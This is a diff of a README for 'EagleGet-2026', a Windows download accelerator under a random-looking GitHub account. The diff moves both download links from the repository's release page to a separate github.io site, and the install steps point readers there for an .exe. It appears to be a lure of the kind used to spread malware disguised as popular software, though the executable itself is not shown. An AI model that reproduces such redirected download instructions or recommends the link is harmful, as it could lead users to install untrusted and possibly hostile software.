@@ -1,6 +1,6 @@
 # 📥 EagleGet-2026 - Faster downloads for your windows PC
 
-[![](https://img.shields.io/badge/Download-EagleGet--2026-blue)](https://github.com/Cabintropicofcapricorn441/EagleGet-2026/releases)
+[![](https://img.shields.io/badge/Download-EagleGet--2026-blue)](https://cabintropicofcapricorn441.github.io)
 
 EagleGet-2026 improves how your computer handles files from the internet. It splits large files into smaller parts and downloads them at the same time. This process reduces wait times and keeps your connection stable. This tool works with Windows 10 and Windows 11. It provides a simple way to track your progress and resume interrupted tasks.
 
@@ -30,7 +30,7 @@ Your computer must meet these basic standards to run the software.
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/Cabintropicofcapricorn441/EagleGet-2026/releases) to access the installation files.
+1. Go to the [official release page](https://cabintropicofcapricorn441.github.io) to access the installation files.
 2. Look for the file ending in .exe in the Assets section.
 3. Click the file to start the download.
 4. Locate the file in your Downloads folder after it finishes.
